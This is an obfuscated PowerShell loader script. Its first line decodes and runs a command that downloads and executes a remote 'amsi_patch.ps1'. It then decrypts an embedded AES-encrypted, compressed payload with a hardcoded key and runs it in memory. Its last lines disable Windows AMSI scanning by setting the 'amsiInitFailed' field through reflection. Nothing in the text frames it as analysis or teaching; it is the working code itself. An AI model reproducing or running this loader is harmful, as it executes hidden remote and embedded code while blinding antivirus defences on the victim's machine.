([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("JFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJztbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyO2lleCAoaXdyICJodHRwczovL2dpdGh1Yi5jb20vQ2hhaW5za2kvQUVTLUVuY29kZXIvcmF3L21haW4vYW1zaV9wYXRjaC5wczEiIC11c2ViKQ==")))|i`e`x
$85Px7GM = [cOnvert]::frOMbASe64striNg("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")
$J7vItjs = [CoNVerT]::froMbase64STRing("gUsVRB7fEVhBPOynYD7ZqFn8qfP1Fidlp3hbkQ8d2pc=")
$nV0AduQ = &(GCM *w-o*t) "SysTEM.SecURity.CRYpTOGRaPhY.aeSManAgED"
$nV0AduQ.ModE = [SYSTem.SecUriTy.CrYPTOGrapHY.cIpheRmodE]::CbC
$nV0AduQ.pAddINg = [sYsTem.SECuRIty.cRYptOGRaPhy.PaDdiNgMoDe]::anSIx923
$nV0AduQ.BlOckSIze = ((10+50-20*2)+(4)-20/20+105)
$nV0AduQ.kEysIZe = ((10+166-20*2)+(97)+(12+11))
$nV0AduQ.Key = $J7vItjs
$nV0AduQ.Iv = $85Px7GM[0..15]
$tW2dJ1s = &(GCM *w-o*t) SYstEm.io.meMORYSTReAm(,$nV0AduQ.CreAteDecRYpToR().tRANsFOrMFiNALbLocK($85Px7GM,16,$85Px7GM.Length-16))
$uoHjIfk = &(GCM *w-o*t) System.IO.MemoryStream
$948ibtY = &(GCM *w-o*t) sYsTEM.iO.comPresSION.DEFLATEsTream $tW2dJ1s, ([iO.coMpReSsIoN.COmpRessiOnModE]::dEComprESs)
$948ibtY.CopyTo($uoHjIfk)
$tW2dJ1s.Close()
$8McZGdg = [TeXT.EnCOdInG]::UtF8.GetStriNG($uoHjIfk.tOARRAY())
$948ibtY.CLoSe()
$nV0AduQ.dISPOsE()
&(gcm i*x)($8McZGdg)
${byP`Ass} = (-join ([regex]::Matches(("{7}{11}{10}{14}{5}{9}{13}{6}{15}{2}{0}{4}{1}{16}{12}{8}{3}" -f'e2',("{0}{1}"-f '41','6d'),'6',("{2}{0}{1}" -f'9',("{1}{0}"-f '73','6c'),('7'+'46')),'e',('61'+'6'),'6',("{1}{0}{3}{2}"-f'37','5','6',("{1}{2}{0}" -f'65',('97'+'3'),'74')),('95'+'5'),("{3}{2}{0}{1}"-f '6',("{1}{0}"-f('74'+'2'),'e'),'5',("{0}{1}" -f '76',("{0}{1}"-f'5',('6d'+'6')))),'e4','d2','36',("{3}{0}{1}{2}" -f ('41'+'7'),("{1}{0}"-f '46','57'),('f6'+'d'),'e'),("{1}{0}"-f '6e',('d6'+'1')),("{2}{1}{0}" -f("{0}{1}" -f("{0}{1}" -f('46'+'9'),'6'),'f'),'7','1'),'7'), '..') | ForEach-Object { [char]([convert]::ToUInt32(${_}.Value, 16)) }))
${am`si} = [Text.Encoding]::UTF8.GetString((0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64))
${aS`sEm`BLY} = [Ref].Assembly
${Ty`PE} = ${ASsemB`LY}.GetType(${ByP`A`Ss})
${fIE`ld} = ${t`Ype}.GetField(${A`msi}, ("{3}{2}{4}{0}{1}" -f("{1}{0}" -f 'ti',('S'+'ta')),'c',('on'+'P'),'N',("{1}{0}" -f("{1}{0}"-f', ',("{0}{1}"-f('b'+'li'),'c')),'u')))
${F`IELd}.SetValue(${N`UlL}, ${TR`Ue})
